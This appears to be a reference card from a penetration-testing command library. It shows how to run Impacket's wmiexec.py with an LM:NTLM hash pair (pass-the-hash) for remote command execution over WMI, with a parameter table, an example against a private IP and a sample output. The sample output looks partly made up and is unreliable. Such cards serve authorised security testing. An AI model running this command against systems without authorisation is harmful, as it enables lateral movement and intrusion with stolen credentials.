---
id: edcdb5c0-7fe7-4c51-a299-55ab6a0f7f6d
name: impacket-wmiexec-execute-with-ntlm-hash
type: command
executor: bash
data: 'wmiexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes $_LM_HASH:$_NTLM_HASH'
output: null
created_at: '2023-04-06T03:56:30.837345+00:00'
updated_at: '2023-10-10T20:37:57.936960+00:00'
platforms:
  - Windows
tags:
  - impacket
  - remote-execution
  - wmi
  - pass-the-hash
verified: true
validated: true
---

# impacket-wmiexec-execute-with-ntlm-hash

## Command

```bash
wmiexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes $_LM_HASH:$_NTLM_HASH
```

## Description

Executes commands via WMI using NTLM hash authentication (pass-the-hash), avoiding plaintext passwords. Connects over port 135 and a high port for WMI communication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | Yes (or empty for local) |
| $_USERNAME | Username for authentication | Yes |
| $_TARGET_IP | IP address or hostname of target | Yes |
| -hashes | Specifies LM:NTLM hash pair | Yes |
| $_LM_HASH | LM hash (often aad3b435b51404eeaad3b435b51404ee for empty) | Yes |
| $_NTLM_HASH | NTLM hash of the password | Yes |

## Examples

### Basic Usage

```bash
wmiexec.py DOMAIN/user@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Connecting to 192.168.1.100...
[*] Executing command...
user\domain

## Related

- [[procedures/Remote-Command-Execution-with-Impacket-Using-Credentials]]
- [[tools/Impacket]]
